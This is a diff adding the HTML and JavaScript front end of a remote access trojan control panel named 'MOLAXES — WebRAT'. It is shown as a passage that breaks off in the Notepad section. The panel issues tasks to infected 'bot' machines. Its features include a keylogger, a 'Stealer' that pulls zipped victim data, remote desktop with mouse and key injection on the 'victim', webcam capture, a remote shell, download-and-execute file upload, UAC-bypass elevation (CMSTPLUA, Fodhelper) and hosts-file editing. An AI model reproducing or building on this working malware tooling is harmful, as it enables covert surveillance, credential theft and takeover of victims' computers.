@@ -1,0 +1,743 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MOLAXES — WebRAT</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{width:100%;height:100%}
+body{background:#111;color:#ccc;font-family:Arial,Helvetica,sans-serif;overflow:hidden}
+.app{width:100%;height:100vh;display:flex}
+.sidebar{width:200px;min-width:200px;height:100vh;background:#171717;border-right:1px solid #303030;display:flex;flex-direction:column}
+.top{height:42px;min-height:42px;display:flex;align-items:center;padding-left:18px;border-bottom:1px solid #292929;gap:12px}
+.hamburger{width:22px;height:20px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer}
+.hamburger span{width:22px;height:2px;background:#aaa}
+.brand{color:#d83fd7;font-weight:700;letter-spacing:1.5px;font-size:15px;text-transform:uppercase;text-shadow:0 0 20px rgba(216,63,215,0.15)}
+.menu-row{display:flex;align-items:stretch}
+.menu{width:145px}
+.menu-item{position:relative;height:35px;display:flex;align-items:center;padding-left:10px;background:#1d1d1d;border-bottom:1px solid #2b2b2b;color:#999;font-size:13px;transition:.15s;cursor:pointer}
+.menu-item::before{content:"";position:absolute;left:0;top:0;bottom:0;width:2px;background:#d83fd7}
+.menu-item:first-child{background:#252525;color:#eee}
+.menu-item:hover{background:#292929;color:#eee}
+.menu-item.active{background:#252525;color:#eee}
+.exit-button{width:52px;min-width:52px;align-self:stretch;border:0;border-right:2px solid #d83fd7;background:#151515;display:flex;align-items:center;justify-content:center;cursor:pointer}
+.exit-button:hover{background:#202020}
+.arrow{width:16px;height:16px;border-left:3px solid #ddd;border-bottom:3px solid #ddd;transform:rotate(45deg);transition:.15s}
+.exit-button:hover .arrow{border-color:#fff;transform:rotate(45deg) translate(-2px,2px)}
+.account{margin-top:auto;width:145px;margin-left:52px;padding:10px;border-top:1px solid #303030;text-align:center;font-size:11px;color:#777}
+.settings{margin-bottom:14px;color:#aaa}
+.status{margin-top:10px;color:#bbb}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#f85149;margin-right:5px}
+.dot.online{background:#3fb950}
+.main{flex:1;height:100vh;padding:0 12px;overflow:auto}
+.card{width:545px;max-width:100%;background:#1b1b1b;border:1px solid #292929;margin-bottom:8px}
+.card-title{height:37px;display:flex;align-items:center;justify-content:space-between;padding:0 10px;font-size:16px;font-weight:bold;color:#eee;border-bottom:2px solid #d83fd7}
+.refresh{color:#999;font-size:23px;cursor:pointer}
+.info{padding:0 9px 9px}
+.info-row{min-height:28px;display:grid;grid-template-columns:116px 1fr;align-items:center;border-bottom:1px solid #292929;font-size:14px}
+.info-label{color:#ddd}
+.info-value{color:#ccc}
+.info-end{height:27px;border-bottom:2px solid #d83fd7}
+.statistics{height:160px;padding:10px}
+.chart{position:relative;height:105px;border-bottom:1px solid #333;background:repeating-linear-gradient(to top,transparent 0,transparent 25px,#242424 26px)}
+.chart-bar{position:absolute;right:8px;bottom:0;width:25px;height:34px;background:#d83fd7;border:2px solid #ee70eb}
+.chart-label{position:absolute;right:5px;bottom:38px;font-size:10px;color:#ccc}
+.legend{padding-top:8px;text-align:center;font-size:13px;color:#ccc}
+.btn{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:4px 14px;border-radius:4px;cursor:pointer;font-size:12px}
+.btn:hover{background:#30363d}
+.btn.primary{background:#1f6feb;border-color:#1f6feb;color:#fff}
+.btn.danger{color:#f85149;border-color:#f85149}
+.fm-item{display:flex;justify-content:space-between;padding:3px 8px;border-bottom:1px solid #1a1a1a;cursor:pointer}
+.fm-item:hover{background:#1a1a1a}
+.fm-item .name{color:#58a6ff}
+.fm-item .name.file{color:#e6edf3}
+.fm-item .size{color:#8b949e;font-size:11px}
+.fm-toolbar{display:flex;gap:6px;padding:6px 0}
+.fm-toolbar input{flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px}
+.fm-upload{display:flex;gap:6px;padding:6px 0;flex-wrap:wrap}
+.fm-upload input[type=file]{display:none}
+.log-box{background:#0d1117;border:1px solid #21262d;border-radius:4px;padding:8px;max-height:200px;overflow-y:auto;font-family:'Courier New',monospace;font-size:12px;color:#8b949e;white-space:pre-wrap;word-break:break-all}
+.log-list{max-height:300px;overflow-y:auto}
+.log-item{display:flex;justify-content:space-between;padding:4px 8px;border-bottom:1px solid #1a1a1a}
+.log-item .name{color:#58a6ff;cursor:pointer}
+.log-item .size{color:#8b949e}
+img.screenshot{max-width:100%;border:1px solid #333;border-radius:4px;background:#000;max-height:400px}
+@media(max-width:800px){.sidebar{width:180px;min-width:180px}.menu{width:128px}.account{width:128px}.main{padding:0 8px}}
+</style>
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+    <div class="top">
+      <div class="hamburger"><span></span><span></span><span></span></div>
+      <span class="brand">MOLAXES</span>
+    </div>
+    <div class="menu-row">
+      <button class="exit-button" id="exitButton" title="Exit"><span class="arrow"></span></button>
+      <nav class="menu" id="menu">
+        <div class="menu-item active" data-tab="info">Information</div>
+        <div class="menu-item" data-tab="remote">Remote start</div>
+        <div class="menu-item" data-tab="proxy">Proxy</div>
+        <div class="menu-item" data-tab="steal">Stealer</div>
+        <div class="menu-item" data-tab="clipboard">Clipboard</div>
+        <div class="menu-item" data-tab="rofi">Rofi</div>
+        <div class="menu-item" data-tab="script">Code & Scripts</div>
+        <div class="menu-item" data-tab="comm">Communication</div>
+        <div class="menu-item" data-tab="tasklist">Task manager</div>
+        <div class="menu-item" data-tab="files">File manager</div>        <div class="menu-item" data-tab="terminal">Terminal</div>
+        <div class="menu-item" data-tab="keylog">KeyLogger</div>
+        <div class="menu-item" data-tab="cam">Webcam</div>
+        <div class="menu-item" data-tab="screen">Remote desktop</div>
+        <div class="menu-item" data-tab="hiddendesktop">Hidden desktop</div>
+        <div class="menu-item" data-tab="system">System</div>
+        <div class="menu-item" data-tab="notepad">Notepad</div>
+        <div class="menu-item" data-tab="chat">Chat</div>
+      </nav>
+    </div>
+    <div class="account">
+      <div class="settings">settings</div>
+      <div id="botName">DESKTOP-Q3LEWF9</div>
+      <div class="status"><span class="dot online" id="statusDot"></span><span id="statusText">Online</span></div>
+    </div>
+  </aside>
+  <main class="main" id="mainContent"></main>
+</div>
+<script>
+document.getElementById('exitButton').addEventListener('click', function(){ window.location.href = '/'; });
+
+const urlParams = new URLSearchParams(window.location.search);
+const AGENT_ID = urlParams.get('user') || '05277c2db9069a04';
+
+async function execCmd(cmd, args = {}) {
+  const payload = { agent_id: AGENT_ID, cmd, args };
+  try {
+    const resp = await fetch('/task', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    const data = await resp.json();
+    if (data.task_id) return await pollTask(data.task_id);
+    return null;
+  } catch (e) { console.error(e); return null; }
+}
+async function pollTask(taskId) {
+  for (let i = 0; i < 40; i++) {
+    await sleep(500);
+    try {
+      const resp = await fetch('/output/' + taskId);
+      const data = await resp.json();
+      if (data.done) return data.output || '';
+    } catch(e) {}
+  }
+  return null;
+}
+function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+function log(msg){console.log(msg);}
+
+let bgTasks = {};
+function startBackground(taskId, callback, interval = 500) {
+  if (bgTasks[taskId]) return;
+  bgTasks[taskId] = true;
+  (async function loop(){ while(bgTasks[taskId]) { await callback(); await sleep(interval); } })();
+}
+function stopBackground(taskId){ if(bgTasks[taskId]) { bgTasks[taskId]=false; delete bgTasks[taskId]; } }
+
+async function loadBotInfo() {
+  try {
+    const resp = await fetch('/api/users');
+    const data = await resp.json();
+    if (data.success && data.result) {
+      const bot = data.result.find(u => u.uid === AGENT_ID || u.id === AGENT_ID);
+      if (bot) {
+        document.getElementById('botName').textContent = bot.pcname || bot.host || 'Agent';
+        const dot = document.getElementById('statusDot');
+        const st = document.getElementById('statusText');
+        const online = bot.status === 0 || bot.online;
+        if (dot) dot.className = 'dot ' + (online ? 'online' : 'offline');
+        if (st) st.textContent = online ? 'Online' : 'Offline';
+        return bot;
+      }
+    }
+  } catch(e) {}
+  return null;
+}
+startBackground('botInfo', loadBotInfo, 3000);
+
+async function renderInfo() {
+  const bot = await loadBotInfo();
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>PC info</span><span class="refresh" onclick="loadBotInfo();log('Refreshed');">↻</span></div>
+      <div class="info">
+        <div class="info-row"><span class="info-label">Username:</span><span class="info-value" id="username">${bot?.user || '—'}</span></div>
+        <div class="info-row"><span class="info-label">PC-name:</span><span class="info-value" id="pcname">${bot?.pcname || '—'}</span></div>
+        <div class="info-row"><span class="info-label">User id:</span><span class="info-value" id="userid">${bot?.uid || bot?.id || '—'}</span></div>
+        <div class="info-row"><span class="info-label">IP:</span><span class="info-value" id="ip">${bot?.ip || '—'}</span></div>
+        <div class="info-row"><span class="info-label">Location:</span><span class="info-value" id="location">${bot?.country || '—'}</span></div>
+        <div class="info-row"><span class="info-label">ASN:</span><span class="info-value" id="asn">—</span></div>
+        <div class="info-row"><span class="info-label">Hosting:</span><span class="info-value" id="hosting">—</span></div>
+        <div class="info-row"><span class="info-label">Active window:</span><span class="info-value" id="activewin">—</span></div>
+        <div class="info-row"><span class="info-label">System:</span><span class="info-value" id="system">${bot?.uos || '—'}</span></div>
+        <div class="info-row"><span class="info-label">Last active:</span><span class="info-value" id="lastactive">${bot?.active ? new Date(bot.active * 1000).toLocaleString() : '—'}</span></div>
+        <div class="info-row"><span class="info-label">Debut:</span><span class="info-value" id="debut">${bot?.firstseen ? new Date(bot.firstseen * 1000).toLocaleString() : '—'}</span></div>
+        <div class="info-row"><span class="info-label">Admin rights:</span><span class="info-value" id="admin">${bot?.adm === 'true' ? 'true' : 'false'}</span></div>
+        <div class="info-row"><span class="info-label">CPU:</span><span class="info-value" id="cpu">${bot?.ucpu || '—'}</span></div>
+        <div class="info-row"><span class="info-label">GPU:</span><span class="info-value" id="gpu">${bot?.ugpu || '—'}</span></div>
+        <div class="info-row"><span class="info-label">Ram:</span><span class="info-value" id="ram">${bot?.ram || '—'}</span></div>
+        <div class="info-row"><span class="info-label">Comment:</span><span class="info-value" id="comment">${bot?.comment || '—'}</span></div>
+        <div class="info-end"></div>
+      </div>
+    </section>
+    <section class="card">
+      <div class="card-title"><span>Online statistics</span></div>
+      <div class="statistics">
+        <div class="chart"><div class="chart-label">1H</div><div class="chart-bar" style="height:${bot?.online ? 34 : 5}px"></div></div>
+        <div class="legend">Online: ${bot?.online ? 'Yes' : 'No'} | Last active: ${bot?.active ? new Date(bot.active * 1000).toLocaleString() : '—'}</div>
+      </div>
+    </section>
+  `;
+}
+
+async function renderLogs() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Logs</span></div>
+      <div class="info">
+        <div style="display:flex;gap:8px;padding:8px 0;"><button class="btn" onclick="refreshLogs()">Refresh</button></div>
+        <div class="log-list" id="logList">Loading...</div>
+      </div>
+    </section>
+  `;
+  await refreshLogs();
+}
+async function refreshLogs() {
+  const list = document.getElementById('logList');
+  if(!list) return;
+  try {
+    const resp = await fetch('/api/logs/download?uid=' + AGENT_ID);
+    if(resp.ok) {
+      const blob = await resp.blob();
+      list.innerHTML = `<div class="log-item"><span class="name" onclick="window.open('/api/logs/download?uid=${AGENT_ID}')">${AGENT_ID}.zip</span><span class="size">${(blob.size/1024).toFixed(1)} KB</span></div>`;
+    } else {
+      list.innerHTML = '<div style="color:#8b949e;padding:10px;">No logs</div>';
+    }
+  } catch(e) { list.innerHTML = '<div style="color:#f85149;padding:10px;">Error</div>'; }
+}
+
+let currentPath = 'C:\\';
+async function renderFiles() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>File Manager</span></div>
+      <div class="info">
+        <div class="fm-toolbar">
+          <input type="text" id="fmPath" value="${currentPath}">
+          <button class="btn" onclick="fmGo()">Go</button>
+          <button class="btn" onclick="fmUp()">Up</button>
+          <button class="btn" onclick="fmRefresh()">↻</button>
+        </div>
+        <div id="fmList">Loading...</div>
+        <div class="fm-upload">
+          <button class="btn primary" onclick="document.getElementById('fmFileInput').click()">Upload</button>
+          <input type="file" id="fmFileInput" onchange="fmUploadFile(this)">
+          <span class="status" id="fmStatus" style="color:#8b949e;font-size:12px;padding:4px 0;">Select a file</span>
+        </div>
+      </div>
+    </section>
+  `;
+  await fmRefresh();
+}
+async function fmRefresh() {
+  const list = document.getElementById('fmList');
+  if(!list) return;
+  list.innerHTML = 'Loading...';
+  const out = await execCmd('ls', { path: currentPath });
+  if(out) {
+    const lines = out.split('\n').filter(l=>l.trim());
+    if(lines.length===0) { list.innerHTML = '<div style="color:#8b949e;padding:10px;">Empty</div>'; return; }
+    list.innerHTML = lines.map(line => {
+      const parts = line.split(/\s{2,}/);
+      const type = parts[0] || 'FILE', size = parts[1] || '0', name = parts.slice(3).join(' ') || '';
+      const isDir = type === 'DIR';
+      return `<div class="fm-item" onclick="${isDir?`fmCd('${name}')`:''}">
+        <span class="name ${isDir?'':'file'}">${isDir?'📁':'📄'} ${name}</span>
+        <span class="size">${isDir?'Folder':size}</span>
+      </div>`;
+    }).join('');
+  } else { list.innerHTML = '<div style="color:#f85149;padding:10px;">Error</div>'; }
+}
+function fmGo(){ const p=document.getElementById('fmPath').value; if(p){currentPath=p;fmRefresh();} }
+function fmUp(){ const p=currentPath.split('\\').filter(Boolean); p.pop(); currentPath=(p.length?p.join('\\'):'C:')+'\\'; document.getElementById('fmPath').value=currentPath; fmRefresh(); }
+function fmCd(name){ currentPath += name+'\\'; document.getElementById('fmPath').value=currentPath; fmRefresh(); }
+async function fmUploadFile(input) {
+  const file = input.files[0]; if(!file) return;
+  const status = document.getElementById('fmStatus');
+  if(status) status.textContent = 'Uploading...';
+  try {
+    const b64 = await readFileAsBase64(file);
+    const result = await execCmd('dlexec', { b64: b64, name: file.name });
+    if(status) status.textContent = result && result.includes('ok') ? 'Uploaded: '+file.name : 'Error';
+    fmRefresh();
+  } catch(e){ if(status) status.textContent = 'Error: '+e.message; }
+  input.value='';
+}
+function readFileAsBase64(file){ return new Promise((resolve,reject)=>{ const reader=new FileReader(); reader.onload=(e)=>{ const base64=e.target.result.split(',')[1]||e.target.result; resolve(base64); }; reader.onerror=reject; reader.readAsDataURL(file); }); }
+
+async function renderKeylog() {
+  stopBackground('keylog');
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>KeyLogger <span id="keylogStatus" style="font-weight:normal;font-size:13px;color:#f85149;">OFF</span></span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;">
+          <button class="btn primary" onclick="keylogStart()">Start</button>
+          <button class="btn danger" onclick="keylogStop()">Stop</button>
+          <button class="btn" onclick="keylogClear()">Clear</button>
+        </div>
+        <div class="log-box" id="keylogDisplay" style="max-height:300px;">Press Start...</div>
+      </div>
+    </section>
+  `;
+}
+let keylogActive=false;
+async function keylogStart() {
+  if(keylogActive) return;
+  keylogActive=true;
+  document.getElementById('keylogStatus').textContent='ON';
+  document.getElementById('keylogStatus').style.color='#3fb950';
+  await execCmd('keylog');
+  await sleep(1000);
+  startBackground('keylog', async () => {
+    if(!keylogActive) return;
+    const out = await execCmd('getkeylog');
+    const display = document.getElementById('keylogDisplay');
+    if(out && display && out.length>0) { display.textContent = out; display.scrollTop = display.scrollHeight; }
+  }, 500);
+}
+function keylogStop() {
+  keylogActive=false; stopBackground('keylog');
+  document.getElementById('keylogStatus').textContent='OFF';
+  document.getElementById('keylogStatus').style.color='#f85149';
+  execCmd('stopkeylog');
+}
+function keylogClear(){ const d=document.getElementById('keylogDisplay'); if(d) d.textContent='Cleared'; }
+
+async function renderScreen() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Remote desktop</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;">
+          <button class="btn primary" onclick="captureScreen()">Capture</button>
+          <button class="btn" onclick="clearScreen()">Clear</button>
+        </div>
+        <div id="screenContainer" oncontextmenu="return false;"></div>
+        <div id="screenStatus" style="margin-top:8px;color:#8b949e;">Press button. Click = mouse on victim. Type below to send keys.</div>
+        <div style="display:flex;gap:6px;margin-top:6px;">
+          <input id="screenKeys" placeholder="type → Enter sends to victim's focused window" style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;" onkeydown="if(event.key==='Enter'){sendKeys();return false}">
+          <button class="btn" onclick="sendKeys()">Send keys</button>
+        </div>
+        <div id="screenPos" style="margin-top:4px;color:#555;font-size:11px;"></div>
+      </div>
+    </section>
+  `;
+}
+async function captureScreen() {
+  const img=document.getElementById('screenImg'), status=document.getElementById('screenStatus');
+  if(!img) return;
+  img.style.display='none';
+  if(status) status.textContent='Capturing...';
+  const out=await execCmd('screen');
+  if(out && out.length>0) {
+    let b64=out; if(b64.startsWith('b64:')) b64=b64.substring(4);
+    if(b64.length>100) {
+      img.src='data:image/png;base64,'+b64; img.style.display='block';
+      if(status) status.textContent='Screenshot ('+Math.round(b64.length/1024)+' KB) — click = mouse, type below = keys';
+      wireScreenInput(img);
+    }
+    else { if(status) status.textContent='Error: '+out; }
+  } else { if(status) status.textContent='Failed'; }
+}
+function clearScreen(){ const img=document.getElementById('screenImg'), status=document.getElementById('screenStatus'); if(img){img.src='';img.style.display='none';} if(status) status.textContent='Cleared'; }
+function screenPixel(e){
+  const img=document.getElementById('screenImg');
+  const r=img.getBoundingClientRect();
+  const sx=img.naturalWidth/r.width, sy=img.naturalHeight/r.height;
+  return {x: Math.round((e.clientX-r.left)*sx), y: Math.round((e.clientY-r.top)*sy)};
+}
+function wireScreenInput(img){
+  if(img.dataset.wired) return;
+  img.dataset.wired='1';
+  img.style.cursor='crosshair';
+  const show=e=>{const p=screenPixel(e); const pos=document.getElementById('screenPos'); if(pos) pos.textContent='victim px: '+p.x+','+p.y;};
+  img.addEventListener('mousemove', show);
+  img.addEventListener('click', async e=>{const p=screenPixel(e); await execCmd('mclick',{x:p.x,y:p.y,b:'l'});});
+  img.addEventListener('contextmenu', async e=>{e.preventDefault();const p=screenPixel(e); await execCmd('mclick',{x:p.x,y:p.y,b:'r'});});
+  img.addEventListener('wheel', async ev=>{
+    ev.preventDefault();
+    const p=screenPixel(ev);
+    const d = ev.deltaY<0 ? -1 : 1;
+    await execCmd('mscroll',{x:p.x,y:p.y,d:d});
+  }, {passive:false});
+  img.addEventListener('dblclick', async e=>{const p=screenPixel(e); await execCmd('mclick',{x:p.x,y:p.y,b:'l'}); await execCmd('mclick',{x:p.x,y:p.y,b:'l'});});
+}
+async function sendKeys(){
+  const inp=document.getElementById('screenKeys');
+  if(!inp||!inp.value) return;
+  await execCmd('mkey',{t:inp.value});
+  inp.value='';
+}
+
+async function renderSteal() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Stealer</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;"><button class="btn primary" onclick="runSteal()">Run</button></div>
+        <div id="stealResult" style="margin-top:10px;color:#8b949e;">Press button...</div>
+      </div>
+    </section>
+  `;
+}
+async function runSteal() {
+  const result=document.getElementById('stealResult');
+  if(result) result.textContent='Stealing...';
+  const out=await execCmd('steal');
+  if(result) {
+    if(out && out.startsWith('b64:')) {
+      const b64=out.substring(4);
+      try {
+        const blob=base64ToBlob(b64,'application/zip');
+        const url=URL.createObjectURL(blob);
+        result.innerHTML = 'Done! <a href="'+url+'" download="steal_'+AGENT_ID+'.zip">Download</a> ('+Math.round(blob.size/1024)+' KB)';
+      } catch(e){ result.textContent='Error: '+e.message; }
+    } else { result.textContent = out || 'Done (no data)'; }
+  }
+}
+function base64ToBlob(b64,mime){ const binary=atob(b64); const array=new Uint8Array(binary.length); for(let i=0;i<binary.length;i++){array[i]=binary.charCodeAt(i);} return new Blob([array],{type:mime}); }
+
+async function renderTerminal() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Terminal</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;">
+          <input type="text" id="termInput" placeholder="Command..." style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <button class="btn primary" onclick="runTerminal()">Run</button>
+        </div>
+        <div class="log-box" id="termOutput" style="height:200px;">> Ready</div>
+      </div>
+    </section>
+  `;
+}
+async function runTerminal() {
+  const inp=document.getElementById('termInput'), out=document.getElementById('termOutput');
+  if(!inp||!out) return;
+  const cmd=inp.value.trim(); if(!cmd) return;
+  out.textContent += '\n> '+cmd;
+  const result=await execCmd('exec',{cmd:cmd});
+  out.textContent += '\n'+(result||'(no output)');
+  out.scrollTop=out.scrollHeight;
+}
+
+async function renderElevate() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Elevate</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;">
+          <button class="btn primary" onclick="runElevate(1)">Mode 1 (CMSTPLUA)</button>
+          <button class="btn primary" onclick="runElevate(2)">Mode 2 (Fodhelper)</button>
+        </div>
+        <div id="elevateResult" style="margin-top:10px;color:#8b949e;">Press button...</div>
+      </div>
+    </section>
+  `;
+}
+async function runElevate(mode) {
+  const result=document.getElementById('elevateResult');
+  if(result) result.textContent='Elevating...';
+  const out=await execCmd('elevate',{mode:String(mode)});
+  if(result) result.textContent=out||'Done';
+}
+
+async function renderProxy() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Proxy</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;">
+          <input type="text" id="proxyAddr" placeholder="addr:port" value="0.0.0.0:1080" style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <button class="btn primary" onclick="runProxy()">Start</button>
+        </div>
+        <div id="proxyResult" style="margin-top:10px;color:#8b949e;">Enter address and press Start...</div>
+      </div>
+    </section>
+  `;
+}
+async function runProxy() {
+  const addr=document.getElementById('proxyAddr').value;
+  const result=document.getElementById('proxyResult');
+  if(result) result.textContent='Starting...';
+  const out=await execCmd('proxy',{addr:addr});
+  if(result) result.textContent=out||'Started';
+}
+
+async function renderCam() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Webcam</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;flex-wrap:wrap;">
+          <input type="text" id="camW" placeholder="width" value="320" style="width:60px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <input type="text" id="camH" placeholder="height" value="240" style="width:60px;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <button class="btn primary" onclick="runCam()">Start</button>
+          <button class="btn danger" onclick="stopCam()">Stop</button>
+        </div>
+        <div id="camResult" style="margin-top:10px;color:#8b949e;">Press Start...</div>
+      </div>
+    </section>
+  `;
+}
+async function runCam() {
+  const w=document.getElementById('camW').value||'320', h=document.getElementById('camH').value||'240';
+  const result=document.getElementById('camResult');
+  if(result) result.textContent='Starting...';
+  const out=await execCmd('cam',{w:w,h:h});
+  if(result) result.textContent=out||'Started';
+}
+function stopCam(){ execCmd('stopcam'); document.getElementById('camResult').textContent='Stopped'; }
+
+async function renderRemote() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Remote start</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;">
+          <input type="text" id="remoteCmd" placeholder="Command..." style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <button class="btn primary" onclick="runRemote()">Run</button>
+        </div>
+        <div id="remoteResult" style="margin-top:10px;color:#8b949e;">Enter command and press Run...</div>
+      </div>
+    </section>
+  `;
+}
+async function runRemote() {
+  const cmd=document.getElementById('remoteCmd').value;
+  const result=document.getElementById('remoteResult');
+  if(result) result.textContent='Executing...';
+  const out=await execCmd('exec',{cmd:cmd});
+  if(result) result.textContent=out||'Done';
+}
+
+// ---- Liberium parity ports -------------------------------------------------
+
+function csvRows(text) {
+  // minimal CSV split (PS ConvertTo-Csv output), handles quoted commas
+  const lines = (text||'').split(/\r?\n/).filter(l=>l.trim());
+  if (!lines.length) return [];
+  const parse = l => {
+    const out=[]; let cur='', q=false;
+    for (let i=0;i<l.length;i++){
+      const c=l[i];
+      if(c==='"'){ if(q && l[i+1]==='"'){cur+='"';i++;} else q=!q; }
+      else if(c===',' && !q){ out.push(cur); cur=''; }
+      else cur+=c;
+    }
+    out.push(cur); return out;
+  };
+  const hdr = parse(lines[0]).map(h=>h.replace(/^"|"$/g,''));
+  return lines.slice(1).map(l=>{
+    const cells=parse(l); const o={};
+    hdr.forEach((h,i)=>o[h]=(cells[i]||'').replace(/^"|"$/g,''));
+    return o;
+  });
+}
+
+let procRows=[];
+async function renderProcess() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Task manager</span><span class="refresh" onclick="renderProcess()">↻</span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;">
+          <input id="killPid" placeholder="PID or name" style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <button class="btn danger" onclick="procKill()">Kill</button>
+        </div>
+        <div class="log-box" id="procList" style="max-height:420px;">Loading...</div>
+      </div>
+    </section>`;
+  refreshProcess();
+}
+async function refreshProcess() {
+  const box=document.getElementById('procList'); if(!box) return;
+  const out = await execCmd('process');
+  const rows = csvRows(out).filter(r=>r.Id);
+  procRows = rows;
+  box.innerHTML = `<div style="padding:4px 8px;color:#58a6ff;">Id&nbsp;&nbsp;Name&nbsp;&nbsp;MB&nbsp;&nbsp;Path</div>` +
+    rows.map(r=>`<div class="fm-item"><span class="name file">${r.Id}&nbsp;&nbsp;${r.ProcessName}&nbsp;&nbsp;${r.MB||''}MB&nbsp;&nbsp;${(r.Path||'').split('\\').pop()||''}</span><span class="size">PID ${r.Id}</span></div>`).join('');
+}
+async function procKill() {
+  const v=(document.getElementById('killPid')?.value||'').trim();
+  if(!v) return;
+  if(/^\d+$/.test(v)) await execCmd('killpid',{pid:v});
+  else await execCmd('killname',{name:v});
+  refreshProcess();
+}
+
+let sysOut='';
+async function renderSystem() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>System <span id="sysHint" style="font-weight:normal;font-size:12px;color:#555;"></span></span></div>
+      <div class="info">
+        <div style="display:flex;gap:6px;padding:6px 0;flex-wrap:wrap;">
+          <button class="btn" onclick="sysRun('perf','performance')">Perf</button>
+          <button class="btn" onclick="sysRun('netstat','netstat')">Netstat</button>
+          <button class="btn" onclick="sysRun('services','services')">Services</button>
+          <button class="btn" onclick="sysRun('devices','devices')">Devices</button>
+          <button class="btn" onclick="sysRun('programs','programs')">Programs</button>
+          <button class="btn" onclick="sysRun('autorun','autorun')">AutoRun</button>
+        </div>
+        <div style="display:flex;gap:6px;margin-bottom:6px;">
+          <input id="regPath" placeholder="reg path e.g. HKLM\\Software" style="flex:1;background:#0d1117;border:1px solid #30363d;border-radius:4px;color:#e6edf3;padding:4px 8px;">
+          <button class="btn" onclick="sysRun('reg','registry')">Query</button>
+        </div>
+        <div class="log-box" id="sysBox" style="max-height:420px;">Press a button...</div>
+      </div>
+    </section>`;
+}
+async function sysRun(kind, hint) {
+  const box=document.getElementById('sysBox');
+  if(!box) return;
+  document.getElementById('sysHint').textContent=' ['+hint+']';
+  box.textContent='Loading...';
+  const arg = kind==='reg' ? {path:(document.getElementById('regPath')?.value||'').trim()} : {};
+  const out = await execCmd(kind, arg);
+  sysOut = out||'(no data)';
+  box.innerHTML = renderSysTable(kind, sysOut);
+}
+function renderSysTable(kind, text) {
+  if(kind==='reg' || kind==='netstat' || kind==='perf'){
+    return text.split(/\r?\n/).filter(l=>l.trim()).map(l=>`<div style="padding:1px 0;">${l.replace(/</g,'&lt;')}</div>`).join('');
+  }
+  const rows = csvRows(text).filter(r=>Object.keys(r).some(k=>k));
+  if(!rows.length) return '(no data)';
+  const cols = Object.keys(rows[0]);
+  return `<table style="width:100%;font-size:12px;border-collapse:collapse;">`+
+    `<tr>${cols.map(c=>`<th style="text-align:left;padding:3px 6px;border-bottom:1px solid #30363d;color:#58a6ff;">${c}</th>`).join('')}</tr>`+
+    rows.map(r=>`<tr>${cols.map(c=>`<td style="padding:2px 6px;border-bottom:1px solid #1a1a1a;">${(String(r[c]||'')).slice(0,160).replace(/</g,'&lt;')}</td>`).join('')}</tr>`).join('')+
+    `</table>`;
+}
+
+const NP_HOSTS = 'C:\\Windows\\System32\\drivers\\etc\\hosts';
+let npPath = '';
+async function renderNotepad() {
+  const main = document.getElementById('mainContent');
+  main.innerHTML = `
+    <section class="card">
+      <div class="card-title"><span>Notepad</span></div>
+      <div class="info">
+        <div class="fm-toolbar">
+          <input type="text" id="npPath" value="${npPath||''}" placeholder="file path (empty → load below)">
+          <button class="btn" onclick="npOpenHosts()">hosts</button>
+          <button class="btn" onclick="npLoad()">Load</button>
+          <button class="btn primary" onclick="npSave()">Save</button>
+        </div>
+        <div class="status" id="npStatus" style="color:#8b949e;font-size:12px;">Load a file to edit. hosts button fills the path.</div>
